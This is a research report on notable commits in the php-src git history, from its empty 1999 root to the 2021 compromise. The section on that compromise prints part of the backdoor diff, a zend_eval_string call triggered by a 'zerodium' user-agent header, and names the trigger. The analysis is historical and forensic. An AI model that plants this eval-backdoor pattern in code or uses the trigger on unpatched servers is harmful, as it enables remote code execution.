# Scout: php/php-src

- **Repo:** https://github.com/php/php-src
- **Clone:** `/home/diablo/book16/repos/php` (full history, not shallow)
- **Clone size:** 896M working tree; pack 666.86 MiB, 1,103,885 objects
- **History span:** 1999-04-07 → 2026-08-19
- **Commits:** 147,824 on `master` (`git rev-list --count HEAD`); 159,772 `--all`
- **First:** `f70a4db647886f65a3e24249351d2c8abc0cdfb3` 1999-04-07T18:10:10+00:00 SVN Migration `<svn@php.net>` — "Standard project directories initialized by cvs2svn."
- **Last (as of scout):** `19bbfbdba594e990fa1892a82ce206d1dfade6a8` 2026-08-19T13:49:21+08:00 Weilin Du / committer GitHub — "[skip ci] fix NEWS section order"
- **What this history actually is:** a CVS→SVN→git conversion of **PHP 4 / Zend Engine**, not PHP 1–3. PHP's 1994 birth is not in this object store.

Do not modify the repo. Every hash below was reproduced with the command shown.

---

## 1. The "fix typo" that is still an ancestor of master

- **Find-type:** 6 (revert war) — also 2 (faked identity) and 7 (the 11-line "typo" *is* the RCE)
- **Hashes:**
  - `c730aa26bd52829a49f2ad284b181b7e82a68d7d` — planted
  - `046827a7e867bb0e655923c75c25a20d06e3aa8b` — real revert
  - `2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a` — planted again
  - `8d743d5281c29e9750e183804b7ba02e1ff82f0b` — final revert
- **Date:** 2021-03-28 (Sunday)
- **Authors (as recorded):** Rasmus Lerdorf `<rasmus@lerdorf.com>`; Nikita Popov `<nikita.ppv@gmail.com>`; Nikita Popov; Levi Morrison `<levi.morrison@datadoghq.com>`
- **Messages:** `[skip-ci] Fix typo` → `Revert "[skip-ci] Fix typo"` → `Revert "Revert "[skip-ci] Fix typo""` → `Revert "Revert "Revert "[skip-ci] Fix typo"""`

```
$ git -C ~/book16/repos/php show --format=fuller c730aa26bd52829a49f2ad284b181b7e82a68d7d
commit c730aa26bd52829a49f2ad284b181b7e82a68d7d
Author:     Rasmus Lerdorf <rasmus@lerdorf.com>
AuthorDate: Sun Mar 28 05:57:07 2021 +0200
Commit:     Rasmus Lerdorf <rasmus@lerdorf.com>
CommitDate: Sun Mar 28 05:57:07 2021 +0200

    [skip-ci] Fix typo

    Fixes minor typo.

    Signed-off-by: Rasmus Lerdorf <rasmus@lerdorf.com>
```

The diff is 11 insertions in `ext/zlib/zlib.c`. It is not a typo. If `HTTP_USER_AGENTT` (extra T) contains the string `zerodium`, PHP `zend_eval_string`s the rest of the header:

```
$ git -C ~/book16/repos/php show c730aa26 -- ext/zlib/zlib.c
+if (strstr(Z_STRVAL_P(enc), "zerodium")) {
+zend_try {
+zend_eval_string(Z_STRVAL_P(enc)+8, NULL, "REMOVETHIS: sold to zerodium, mid 2017");
+} zend_end_try();
```

Nikita's real revert, five hours later, says the quiet part:

```
$ git -C ~/book16/repos/php show --format=fuller 046827a7e867bb0e655923c75c25a20d06e3aa8b
Author:     Nikita Popov <nikita.ppv@gmail.com>
AuthorDate: Sun Mar 28 11:16:39 2021 +0200

    Revert "[skip-ci] Fix typo"

    This reverts commit c730aa26bd52829a49f2ad284b181b7e82a68d7d.

    This looks like the result of a compromised git account. Commit
    access has already been revoked.
```

Then the attacker came back *as Nikita* (same real email `nikita.ppv@gmail.com`, used on 7,162 other commits) and re-applied the exact same tree:

```
$ git -C ~/book16/repos/php rev-parse c730aa26^{tree} 2b0f239b^{tree}
a1c87b3d3dcea24d3f232a65345b66c4968a6ed3
a1c87b3d3dcea24d3f232a65345b66c4968a6ed3
```

Levi Morrison closed the loop ~90 minutes later (`8d743d52`, 11:53 -0600). Both malicious commits **are ancestors of current `master`**:

```
$ git -C ~/book16/repos/php merge-base --is-ancestor c730aa26 HEAD; echo $?
0
$ git -C ~/book16/repos/php merge-base --is-ancestor 2b0f239b HEAD; echo $?
0
```

They were not rewritten out. They were not dropped when the canonical remote moved to GitHub. `git log --grep=zerodium` finds **nothing** — the word never appears in a commit *message*. Only `-S zerodium` or reading the revert diffs shows the payload.

Identity tells, from git metadata alone, without trusting news:

```
$ git -C ~/book16/repos/php log --all --author='Rasmus' --grep='Signed-off-by' --format='%H %aI %ae %s'
c730aa26bd52829a49f2ad284b181b7e82a68d7d 2021-03-28T05:57:07+02:00 rasmus@lerdorf.com [skip-ci] Fix typo
```

That is Rasmus's **only** `Signed-off-by` in this entire repository. The email `rasmus@lerdorf.com` is real (93 other commits), but those sit at `-07:00` / `-08:00` / `-04:00`. The backdoor is `+0200` at 05:57 on a Sunday, wearing `[skip-ci]` so CI would not see `zend_eval_string`.

- **Why it is a story:** Sunday morning, someone with write access to `git.php.net` pushed eleven lines under the founder's name, tagged them a typo, and skipped CI. For a few hours the development branch of PHP would execute attacker-controlled PHP if a request carried `User-Agentt: zerodium…`. Nikita reverted and revoked access; the same hand came back wearing Nikita's name and put the tree back. Levi reverted the revert of the revert. Nobody rewrote history. The malware commits are still parent-reachable from every PHP 8.1+ checkout.
- **What the reader learns:** Author name, author email, and `Signed-off-by` are stickers. A revert is a confession that stays in the graph forever. `[skip-ci]` is an attacker-shaped hole if it also skips review. If you ever need to prove a commit is fake, look for the *one* thing the impersonator added that the real person never did.
- **Surprise:** 4

---

## 2. Day one is an empty tree, five years late

- **Find-type:** 3 (first commit / what day one shows) — also 2 (migration-planted timestamp)
- **Hash:** `f70a4db647886f65a3e24249351d2c8abc0cdfb3`
- **Date:** 1999-04-07T18:10:10+00:00
- **Author:** SVN Migration `<svn@php.net>`
- **Message:** `Standard project directories initialized by cvs2svn.`

```
$ git -C ~/book16/repos/php log --reverse --format='%H %aI %an <%ae> %s' | head -3
f70a4db647886f65a3e24249351d2c8abc0cdfb3 1999-04-07T18:10:10+00:00 SVN Migration <svn@php.net> Standard project directories initialized by cvs2svn.
573b46022c46ab41a879c23f4ea432dd4d0c102e 1999-04-07T18:10:10+00:00 Andi Gutmans <andi@php.net> Zend Library
a6043d3e1efa4cb7564118765dadd53cedd9d194 1999-04-07T18:18:16+00:00 Rasmus Lerdorf <rasmus@php.net> *** empty log message ***

$ git -C ~/book16/repos/php cat-file -p f70a4db647886f65a3e24249351d2c8abc0cdfb3
tree 4b825dc642cb6eb9a060e54bf8d69288fbee4904
author SVN Migration <svn@php.net> 923508610 +0000
committer SVN Migration <svn@php.net> 923508610 +0000

Standard project directories initialized by cvs2svn.

$ git -C ~/book16/repos/php hash-object -t tree /dev/null
4b825dc642cb6eb9a060e54bf8d69288fbee4904
```

The root commit of php-src is Git's well-known **empty tree**. `cvs2svn` created "standard project directories"; Git does not store empty dirs, so the object is vacant. Eight minutes later Andi Gutmans drops the entire Zend Engine (`573b460`, same timestamp `18:10:10` — a converter clock, not a human one). Twenty-seven minutes after that Zeev Suraski commits `PHP 4.0` (`aceaabce`), the real payload: CREDITS, ChangeLog, Makefile, the language.

PHP/FI is 1994. PHP 3 is 1998. None of that is here. Day-two messages are already erasing it (`bb6dff9c` "Buh-bye php3_ini"; `4b98f345` "php3_ini?  What's that?").

- **Why it is a story:** A reader who clones php-src to "see where PHP began" lands on a vacant tree dated 1999, authored by a robot, sharing a timestamp with a 20,000-line Zend dump. The founding myth is one repository over, or in a tarball, or gone. What this git is willing to remember starts the morning Andi and Zeev imported the rewrite.
- **What the reader learns:** `git log --reverse | head` is the first question to ask of any famous repo. Conversion tools plant authors, dates, and empty commits. "The history of X" is often "the history of the version-control system X happened to be in when someone first cared."
- **Surprise:** 4

---

## 3. The inventor's first mark is a blank line

- **Find-type:** 3
- **Hash:** `a6043d3e1efa4cb7564118765dadd53cedd9d194`
- **Date:** 1999-04-07T18:18:16+00:00
- **Author:** Rasmus Lerdorf `<rasmus@php.net>`
- **Message:** `*** empty log message ***`

```
$ git -C ~/book16/repos/php show a6043d3e1efa4cb7564118765dadd53cedd9d194
commit a6043d3e1efa4cb7564118765dadd53cedd9d194
Author: Rasmus Lerdorf <rasmus@php.net>
Date:   Wed Apr 7 18:18:16 1999 +0000

    *** empty log message ***

diff --git a/Zend/zend.c b/Zend/zend.c
--- a/Zend/zend.c
+++ b/Zend/zend.c
@@ -14,6 +14,7 @@
+
 #include "zend.h"
```

Eight minutes after Andi imported Zend, Rasmus — the person who wrote PHP — adds one empty line to `zend.c` and leaves the CVS log blank. His next commits are weeks later and practical (`Bring imap build rules up to date`, `This is generated`, `Argh!  That typo took me over an hour to find.  Grr..`). He will make 1,470 commits in this repo. The first one does not compile anything, fix anything, or say anything.

- **Why it is a story:** The morning the Zend rewrite lands, the original author of the language is already a guest in someone else's tree. His first recorded act is whitespace. The power shift from "Rasmus's PHP" to "Andi and Zeev's Zend" is not announced; it is visible in the order of the first three hashes.
- **What the reader learns:** First-author prestige in `git shortlog` is a function of when the repo started recording, not of who started the project. Empty messages and empty diffs are not noise — they are the moment someone had commit bits and nothing ready to say.
- **Surprise:** 4

---

## 4. T_PAAMAYIM_NEKUDOTAYIM was in the first Zend commit and never left

- **Find-type:** 5 (comment/name that outlived its code — here, a token name that outlived its user-facing life)
- **Hashes:** `573b46022c46ab41a879c23f4ea432dd4d0c102e` (birth); `cf5ba0feec63f4fc60c0703100163cf567e611c8` (apology alias); `55a15f32ced0bd2467e6dec0c1287a4f11b1852f` (errors stop saying it)
- **Dates:** 1999-04-07; 2002-02-08; 2020-06-11 / committed 2020-07-13
- **Authors:** Andi Gutmans; Stig Bakken; Rowan Tommins (committed by Nikita Popov)

It is in the very first non-empty commit, no comment, no translation:

```
$ git -C ~/book16/repos/php grep -n 'PAAMAYIM' 573b46022c46ab41a879c23f4ea432dd4d0c102e -- '*.y' '*.l'
573b46022c46ab41a879c23f4ea432dd4d0c102e:Zend/zend-parser.y:125:%token T_PAAMAYIM_NEKUDOTAYIM
573b46022c46ab41a879c23f4ea432dd4d0c102e:Zend/zend-scanner.l:551:return T_PAAMAYIM_NEKUDOTAYIM;
```

`::` in Hebrew grammar is *pa'amayim nekudotayim* — "twice colon." Andi (Israeli) named the token as a private joke and shipped it. Three years later the tokenizer extension already refuses to show users the joke:

```
$ git -C ~/book16/repos/php show cf5ba0fe:ext/tokenizer/tokenizer.c | grep -n -E 'PAAMAYIM|DOUBLE_COLON'
268:    REGISTER_LONG_CONSTANT("T_PAAMAYIM_NEKUDOTAYIM", T_PAAMAYIM_NEKUDOTAYIM, ...);
269:    REGISTER_LONG_CONSTANT("T_DOUBLE_COLON", T_PAAMAYIM_NEKUDOTAYIM, ...);
462:        case T_PAAMAYIM_NEKUDOTAYIM: return "T_DOUBLE_COLON";
```

Both constants still resolve to the same token. `token_name()` still lies:

```
$ git -C ~/book16/repos/php grep -n 'PAAMAYIM' -- ext/tokenizer/tokenizer_data.c Zend/zend_language_parser.y
Zend/zend_language_parser.y:234:%token T_PAAMAYIM_NEKUDOTAYIM "'::'"
ext/tokenizer/tokenizer_data.c:168:case T_PAAMAYIM_NEKUDOTAYIM: return "T_DOUBLE_COLON";
```

In 2020 Rowan Tommins's message names the folklore and retires it from parse errors (`55a15f32`): *including the notorious `unexpected '::' (T_PAAMAYIM_NEKUDOTAYIM)`*. The bison `%token` stays. `git blame` on that line stops at Rowan; `git log -S T_PAAMAYIM_NEKUDOTAYIM -- Zend/zend-parser.y Zend/zend_language_parser.y` bottoms out at Andi's 1999 dump. There is **no** in-tree comment that says "this is Hebrew."

- **Why it is a story:** A bilingual in-joke is committed as if it were `T_DOUBLE_COLON`, then survives every rewrite of the parser, every engine, every RFC. Userland is given an English alias in 2002; error messages are cleaned in 2020; the grammar file in 2026 still says `T_PAAMAYIM_NEKUDOTAYIM`. The name outlived the willingness to show it to beginners.
- **What the reader learns:** Internal identifiers are the comments that cannot be deleted without breaking the world. If a joke ships in a parser token, you will still be explaining it in twenty-seven years. Aliases (`T_DOUBLE_COLON`) are how a project apologizes without renaming.
- **Surprise:** 3

---

## 5. Two characters that turned register_globals off

- **Find-type:** 1 (tiny diff, huge blast radius)
- **Hash:** `0bf51b81bddf7ac0b6666f896cb32fe9c137c5f2`
- **Date:** 2002-02-05T06:31:53+00:00
- **Author:** Yasuo Ohgaki `<yohgaki@php.net>`
- **Message:** `register_globals=off is defualt for 4.2.0`

```
$ git -C ~/book16/repos/php show --stat 0bf51b81bddf7ac0b6666f896cb32fe9c137c5f2
    register_globals=off is defualt for 4.2.0
 main/main.c  | 2 +-
 php.ini-dist | 2 +-
 2 files changed, 2 insertions(+), 2 deletions(-)

$ git -C ~/book16/repos/php show 0bf51b81 -- main/main.c php.ini-dist
-STD_PHP_INI_BOOLEAN("register_globals","1", ...
+STD_PHP_INI_BOOLEAN("register_globals","0", ...
-register_globals = On
+register_globals = Off
```

The entire commit is `"1"` → `"0"` and `On` → `Off`, plus a typo (`defualt`) in the log. Preceded by Zeev's `860b591` (2001-08-11) "Start pushing register_globals annihilation" — a warning in `php.ini-dist` and a new `php.ini-recommended`. Followed, eight years later, by Kalle Sommer Nielsen actually deleting the feature (`febee112`, 2010-04-21, "Removed register_globals").

- **Why it is a story:** For years every `?id=1` request created `$id` in global scope. Half the tutorials on the internet depended on it; half the remote-file-inclusion bugs were it. The day the default flipped, the commit looks like a config nit. The author even misspells "default." The blast is not in the diff.
- **What the reader learns:** The most expensive security fix in a mature project is often a one-character default. `git log -S` on the *default value*, not the feature name, is how you find the moment the world broke. A typo in the commit message is not a reason to skip the commit.
- **Surprise:** 3

---

## 6. A 4,049-commit person named foobar

- **Find-type:** 4 (name that appears / disappears)
- **Hashes:** first `549aec4500f0cd47d17c8f9e0324fccb69fe4757` (2000-07-21); last as foobar `faa2ed197535aa44e84f51a86cb6f81b6984ed34` (2007-07-15); last as Jani Taskinen `9cb1b1e948b8f6e8cf689e5a48bfe46cea56ddd0` (2010-12-17)
- **Author:** `foobar <sniper@php.net>` → `Jani Taskinen <jani@php.net>`

```
$ git -C ~/book16/repos/php shortlog -sn --all | head -12
 11329  Dmitry Stogov
  9245  Nikita Popov
  8432  Anatol Belski
  ...
  4049  foobar
  3804

$ git -C ~/book16/repos/php log --all --format='%an <%ae>' | grep -i foobar | sort | uniq -c
   4049 foobar <sniper@php.net>
```

`foobar` is Jani Taskinen (CVS user `sniper`). Yearly: 2000–2007 as foobar (peak 1,253 in 2005), then 2007–2010 as himself, then silence after two "Update credits" commits on 2010-12-17. The blank author (`3804` commits, mostly `changelog@php.net`) is a sibling artifact — automated ChangeLog bots with no `user.name`.

- **Why it is a story:** One of the top-ten all-time committers in PHP is a joke username. For seven years the release-manager energy of the project is signed `foobar`. Then the name flips to a real one, then it stops. `shortlog -sn` still lists them as two people.
- **What the reader learns:** `git shortlog` is not a census. CVS usernames, bots, and empty `user.name` fragment one human into three leaderboard rows. When a name disappears, look at the *email* and the year histogram before concluding they left — and look at the last subject. "Update credits" is how maintainers close the door.
- **Surprise:** 3

---

## 7. The day after the backdoor, git.php.net is erased from the docs

- **Find-type:** 8 (rollback of the world)
- **Hash:** `49a20cf3db63879cc04b40c9cc799cd23a13efa6`
- **Date:** 2021-03-29T13:34:25+02:00 (author) / 14:05:20+02:00 (Nikita commits it)
- **Author:** Bartosz Gorski `<bartosz.m.gorski@gmail.com>`
- **Message:** `Removed mentions of git.php.net from the documentation`

```
$ git -C ~/book16/repos/php show --stat 49a20cf3db63879cc04b40c9cc799cd23a13efa6
    Removed mentions of git.php.net from the documentation
 CONTRIBUTING.md         |  3 ---
 README.md               | 11 ++++-------
 docs/release-process.md | 19 ++++++++++---------
 scripts/dev/makedist    |  2 +-
 4 files changed, 15 insertions(+), 20 deletions(-)
```

README the day before still said the source of truth was `git.php.net` and that GitHub was a *mirror* ("Pull requests are not merged directly on GitHub. All PRs will be pulled and pushed through git.php.net"). The next-day diff:

```
-The PHP source code is located in the Git repository at
-[git.php.net](https://git.php.net). Contributions are most welcome by forking
-the [GitHub mirror repository](https://github.com/php/php-src)
+Contributions are most welcome by forking the
+[GitHub repository](https://github.com/php/php-src)
```

The last commit on this scout is already `Commit: GitHub <noreply@github.com>`. The hosting change is complete enough to be invisible unless you look at 29 March 2021.

- **Why it is a story:** The backdoor was possible because the canonical server was a shared git host with account-based push. Twenty-four hours later the documentation stops pointing at that server. The malware commits are not deleted; the *door they came through* is. A README edit is the public record of a forge migration.
- **What the reader learns:** After an incident, the interesting commit is often not the revert — it is the one that changes where `origin` is allowed to be. If your README still says "mirror," your threat model is last year's.
- **Surprise:** 3

---

## 8. Maintainers handing over, visible only in windows

- **Find-type:** 4
- **Hashes (bookends):** Andi last `011fd8059d7e8e0ea9a70bc86d817e942dcbb238` (2010-11-24, "Fix typo"); Zeev last burst `a81202ac49282b9752d3181014705260ba1ad088` (2019-01-30, "Adios, yearly copyright ranges"); Nikita first `0a91432828521fdb4122b0663cb6cb9af64b53fa` (2012-02-18); Nikita collapse after 2021; Niels first `c4487b7a12bf80523deb70982c9bdbb9bf4b876c` (2022-12-17)

```
$ git -C ~/book16/repos/php shortlog -sn --all --since=1999-01-01 --until=2002-01-01 | head -5
  1742  Zeev Suraski
  1703  Sascha Schumann
  1144  Andi Gutmans
  1054
   636  Andrei Zmievski

$ git -C ~/book16/repos/php shortlog -sn --all --since=2016-01-01 --until=2021-01-01 | head -4
  6242  Nikita Popov
  4355  Anatol Belski
  3427  Christoph M. Becker
  3214  Dmitry Stogov

$ git -C ~/book16/repos/php shortlog -sn --all --since=2021-01-01 | head -4
  3724  Niels Dossche
  2696  Ilija Tovilo
  2040  Dmitry Stogov
  1770  Christoph M. Becker
```

Nikita by year: 189 (2012) → 2,426 (2019) → 1,630 (2021) → **61 (2022) → 1 (2023)**. Andi by year: 582 (2000) → 1 (2010). Zeev: 666 (2000) → 7 (2006) → a 2018–19 copyright-cleanup cameo. Dmitry Stogov is the constant (11,329, still #3 in the 2021–26 window). Niels's first commit is December 2022; by the 2021–26 window he leads the project.

- **Why it is a story:** There is no "transfer of maintainership" commit. Andi and Zeev fade; a student-shaped Nikita appears in 2012 fixing CLI-server tests, becomes the entire internals voice of PHP 7, then almost stops in 2022. A new name from 2022 is already the all-window leader. The graph records a handover as a change in slope.
- **What the reader learns:** Run `shortlog -sn` on five-year slices, not on all time. All-time leaderboards are dominated by whoever was present for a noisy era (Windows builds, NEWS merges, a conversion). The person who *currently* owns the tree may have a first-commit date last Christmas.
- **Surprise:** 3

---

## 9. Andi's 1999 header lines are still the first lines of zend.h

- **Find-type:** 5
- **Hash:** `573b46022c46ab41a879c23f4ea432dd4d0c102e` (still blamed)
- **Date:** 1999-04-07T18:10:10+00:00
- **Author:** Andi Gutmans `<andi@php.net>`

```
$ git -C ~/book16/repos/php blame Zend/zend.h | head -17
573b46022c46 (Andi Gutmans  1999-04-07 18:10:10 +0000  1) /*
573b46022c46 (Andi Gutmans  1999-04-07 18:10:10 +0000  2)    +----------------------------------------------------------------------+
573b46022c46 (Andi Gutmans  1999-04-07 18:10:10 +0000  3)    | Zend Engine                                                          |
573b46022c46 (Andi Gutmans  1999-04-07 18:10:10 +0000  4)    +----------------------------------------------------------------------+
e4394946c2fe (Ben Ramsey    2026-02-04 20:48:33 -0600  5)    | Copyright © Zend Technologies Ltd., a subsidiary company of          |
e4394946c2fe (Ben Ramsey    2026-02-04 20:48:33 -0600  6)    |     Perforce Software, Inc., and Contributors.                       |
...
54dc07f3dc9f (Zeev Suraski  2018-11-01 17:20:07 +0200 14)    | Authors: Andi Gutmans <andi@php.net>                                 |
54dc07f3dc9f (Zeev Suraski  2018-11-01 17:20:07 +0200 15)    |          Zeev Suraski <zeev@php.net>                                 |
573b46022c46 (Andi Gutmans  1999-04-07 18:10:10 +0000 16)    +----------------------------------------------------------------------+
573b46022c46 (Andi Gutmans  1999-04-07 18:10:10 +0000 17) */
```

The box-drawing banner Andi committed on day one is still lines 1–4 and 16–17 of the engine header. Copyright has been restickered onto Perforce (2026); the Authors: lines were last touched by Zeev in 2018, the year he came back to delete yearly copyright ranges. `ZEND_VERSION` on line 22 is `"4.6.0-dev"`. The names of two people who no longer commit remain the authors of the file that *is* PHP.

- **Why it is a story:** A header comment is the one place a departed founder still speaks in the first person plural. The engine has been rewritten under that banner for twenty-seven years. The 2018 "Authors:" refresh is Zeev, after a twelve-year gap, making sure the names stay correct while he removes the year ranges — a man editing his own epitaph in a file he no longer owns.
- **What the reader learns:** `git blame` the first twenty lines of your oldest header. License and author banners are where corporate events (Zend → Perforce) and personal exits get written down. The code under the banner can be 0% original and the blame will still say 1999.
- **Surprise:** 2

---

## 10. "Our favourite mistake" — day two of Zend

- **Find-type:** 1
- **Hash:** `f2d5ca74829a59fea3755f42ec5b4ab0d0a6b453`
- **Date:** 1999-04-08T20:27:08+00:00
- **Author:** Zeev Suraski `<zeev@php.net>`
- **Message:** `"Our favourite mistake"`

```
$ git -C ~/book16/repos/php show f2d5ca74829a59fea3755f42ec5b4ab0d0a6b453
    "Our favourite mistake"
 Zend/zend-parser.y | 4 ++--
- |ZEND_LINE
- |ZEND_FILE
+ |ZEND_LINE { $$ = $1; }
+ |ZEND_FILE { $$ = $1; }
```

`__LINE__` and `__FILE__` had been accepted by the brand-new parser and then thrown away — the actions were missing. Twenty-six hours after Zend landed, Zeev names the bug like a band.

- **Why it is a story:** The second day of a new engine, the authors already have a "favourite" mistake. The fix is two actions. The message is the only colour in a week of `*** empty log message ***` and `That's better.` Someone was amused, in the room, before anyone outside had compiled this tree.
- **What the reader learns:** The best commit messages in a young repo are not the big dumps. They are the four-line grammar fixes with a joke for an audience of three. Those jokes are how you date a culture.
- **Surprise:** 3

---

## Ranked top 3

1. **The zerodium "fix typo" commits are still ancestors of master** (dig 1). The malware was not rewritten away; git metadata alone (unique `Signed-off-by`, `+0200` at dawn, identical trees, `[skip-ci]`) convicts the impersonation; the revert war is the public record.
2. **This history begins on an empty tree in 1999** (dig 2), and **Rasmus's first mark is a blank line** (dig 3). PHP is five years old and already someone else's rewrite. "Where PHP began" is not in this clone.
3. **`T_PAAMAYIM_NEKUDOTAYIM` ships in the first Zend commit and is still the parser's name for `::`** (dig 4). The tokenizer has been translating it to `T_DOUBLE_COLON` since 2002; parse errors stopped saying it in 2020; the joke was never documented in-tree.

## Disappointing

The 1994–1998 language is simply not here — no PHP/FI, no PHP 3 source, no Rasmus-before-Zend — and the Hebrew joke that everyone comes to this repo for was never explained in a comment, only in the token's name.
